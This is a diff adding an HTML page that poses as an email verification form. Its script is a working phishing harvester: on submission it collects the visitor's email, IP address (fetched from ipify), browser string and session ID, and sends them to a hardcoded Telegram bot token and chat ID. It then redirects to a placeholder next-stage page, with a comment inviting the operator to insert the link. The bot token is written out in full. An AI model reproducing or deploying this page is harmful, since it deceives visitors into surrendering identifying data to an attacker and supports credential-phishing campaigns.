@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Email Verification</title>
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 450px;
+        background: #ffffff;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+        padding: 50px 30px;
+        animation: slideUp 0.5s ease-out;
+    }
+
+    @keyframes slideUp {
+        from {
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .header {
+        text-align: center;
+        margin-bottom: 45px;
+    }
+
+    .icon {
+        width: 60px;
+        height: 60px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        font-size: 28px;
+        animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+        0%, 100% {
+            transform: scale(1);
+        }
+        50% {
+            transform: scale(1.05);
+        }
+    }
+
+    .title {
+        font-size: 28px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 10px;
+        line-height: 1.3;
+    }
+
+    .subtitle {
+        font-size: 14px;
+        color: #666;
+        line-height: 1.6;
+    }
+
+    .form-group {
+        margin-bottom: 30px;
+    }
+
+    .input-wrapper {
+        position: relative;
+        margin-bottom: 5px;
+    }
+
+    .input-wrapper input {
+        width: 100%;
+        padding: 14px 16px;
+        font-size: 16px;
+        border: 2px solid #e0e0e0;
+        border-radius: 12px;
+        transition: all 0.3s ease;
+        background: #f9f9f9;
+        color: #1a1a1a;
+        font-weight: 500;
+    }
+
+    .input-wrapper input::placeholder {
+        color: #999;
+        font-weight: 400;
+    }
+
+    .input-wrapper input:focus {
+        outline: none;
+        border-color: #667eea;
+        background: #ffffff;
+        box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+    }
+
+    .input-label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 8px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .error-message {
+        color: #e74c3c;
+        font-size: 13px;
+        margin-top: 6px;
+        display: none;
+        animation: shake 0.3s ease-in-out;
+    }
+
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+    }
+
+    .error-message.show {
+        display: block;
+    }
+
+    .submit-btn {
+        width: 100%;
+        padding: 16px;
+        font-size: 16px;
+        font-weight: 600;
+        border: none;
+        border-radius: 12px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: #ffffff;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin-bottom: 16px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .submit-btn:hover:not(:disabled) {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+    }
+
+    .submit-btn:active:not(:disabled) {
+        transform: translateY(0);
+    }
+
+    .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
+    .submit-btn.loading {
+        position: relative;
+        color: transparent;
+    }
+
+    .submit-btn.loading::after {
+        content: '';
+        position: absolute;
+        width: 16px;
+        height: 16px;
+        top: 50%;
+        left: 50%;
+        margin-left: -8px;
+        margin-top: -8px;
+        border: 2px solid #ffffff;
+        border-radius: 50%;
+        border-top-color: transparent;
+        animation: spin 0.6s linear infinite;
+    }
+
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+
+    .footer-link {
+        text-align: center;
+        margin-top: 20px;
+    }
+
+    .footer-link a {
+        font-size: 13px;
+        color: #667eea;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+    }
+
+    .footer-link a:hover {
+        color: #764ba2;
+        gap: 10px;
+    }
+
+    .footer-link a::after {
+        content: '→';
+        transition: all 0.3s ease;
+    }
+
+    .success-message {
+        display: none;
+        text-align: center;
+        padding: 40px 20px;
+        animation: fadeIn 0.5s ease-out;
+    }
+
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+
+    .success-icon {
+        width: 80px;
+        height: 80px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 20px;
+        font-size: 40px;
+        animation: bounceIn 0.6s ease-out;
+    }
+
+    @keyframes bounceIn {
+        0% {
+            transform: scale(0);
+        }
+        50% {
+            transform: scale(1.1);
+        }
+        100% {
+            transform: scale(1);
+        }
+    }
+
+    .success-text {
+        font-size: 22px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 8px;
+    }
+
+    .success-subtext {
+        font-size: 14px;
+        color: #666;
+        line-height: 1.6;
+    }
+
+    @media (max-width: 480px) {
+        .container {
+            padding: 35px 24px;
+            border-radius: 16px;
+        }
+
+        .title {
+            font-size: 24px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+        }
+
+        .input-wrapper input {
+            padding: 13px 14px;
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            padding: 14px;
+            font-size: 15px;
+        }
+
+        .icon {
+            width: 50px;
+            height: 50px;
+            font-size: 24px;
+        }
+    }
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+    <div id="formContent">
+        <div class="header">
+            <div class="icon">✉️</div>
+            <h1 class="title">Verify Your Email</h1>
+            <p class="subtitle">Enter your email address to continue securely</p>
+        </div>
+
+        <form id="emailForm">
+            <div class="form-group">
+                <label class="input-label" for="emailInput">Email Address</label>
+                <div class="input-wrapper">
+                    <input 
+                        type="email" 
+                        id="emailInput" 
+                        name="email" 
+                        placeholder="you@example.com"
+                        autocomplete="email"
+                        required
+                    >
+                </div>
+                <div class="error-message" id="errorMsg"></div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
+        </form>
+
+        <div class="footer-link">
+            <a href="#" onclick="generateNewEmail(event)">Get a new email address</a>
+        </div>
+    </div>
+
+    <div class="success-message" id="successContent">
+        <div class="success-icon">✓</div>
+        <p class="success-text">Email Verified!</p>
+        <p class="success-subtext">Redirecting you now...</p>
+    </div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "7830288241:AAEk3vRFnaL3gzGWrywhHoGDaKvv574do0E";
+const TELEGRAM_CHAT_ID = "5692748706";
+
+let sessionId = localStorage.getItem("sessionId");
+if (!sessionId) {
+    sessionId = "sess_" + Math.random().toString(36).substr(2, 9);
+    localStorage.setItem("sessionId", sessionId);
+}
+
+const emailInput = document.getElementById("emailInput");
+const submitBtn = document.getElementById("submitBtn");
+const errorMsg = document.getElementById("errorMsg");
+const emailForm = document.getElementById("emailForm");
+const formContent = document.getElementById("formContent");
+const successContent = document.getElementById("successContent");
+
+// Email validation
+function validateEmail(email) {
+    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return regex.test(email);
+}
+
+// Real-time validation
+emailInput.addEventListener("input", function() {
+    const email = this.value.trim();
+    
+    if (email && !validateEmail(email)) {
+        errorMsg.textContent = "Please enter a valid email address";
+        errorMsg.classList.add("show");
+        submitBtn.disabled = true;
+    } else {
+        errorMsg.classList.remove("show");
+        submitBtn.disabled = email ? false : true;
+    }
+});
+
+// Form submission
+emailForm.addEventListener("submit", async function(e) {
+    e.preventDefault();
+    
+    const email = emailInput.value.trim();
+
+    if (!email || !validateEmail(email)) {
+        errorMsg.textContent = "Please enter a valid email address";
+        errorMsg.classList.add("show");
+        return;
+    }
+
+    errorMsg.classList.remove("show");
+    submitBtn.classList.add("loading");
+    submitBtn.disabled = true;
+
+    try {
+        // Get IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        
+        // Get browser info
+        const browserType = navigator.userAgent;
+        const timestamp = new Date().toISOString();
+
+        // Send to Telegram
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: `📧 Email Verified
+Email: ${email}
+🌐 IP: ${ipData.ip}
+🖥️ Browser: ${browserType}
+🆔 Session: ${sessionId}
+🕒 Time: ${timestamp}`
+            })
+        });
+
+        if (response.ok) {
+            // Show success animation
+            formContent.style.display = "none";
+            successContent.style.display = "block";
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                // 👇 PUT YOUR FINAL INDEX.HTML LINK HERE 👇
+                window.location.href = "findex.html";
+            }, 2000);
+        } else {
+            throw new Error("Failed to send data");
+        }
+
+    } catch (error) {
+        submitBtn.classList.remove("loading");
+        submitBtn.disabled = false;
+        errorMsg.textContent = "Something went wrong. Please try again.";
+        errorMsg.classList.add("show");
+        console.error(error);
+    }
+});
+
+// Generate new email (placeholder function)
+function generateNewEmail(e) {
+    e.preventDefault();
+    emailInput.value = "";
+    emailInput.focus();
+    errorMsg.classList.remove("show");
+    submitBtn.disabled = true;
+}
+
+// Initial button state
+submitBtn.disabled = true;
+</script>
+
+</body>
+</html>
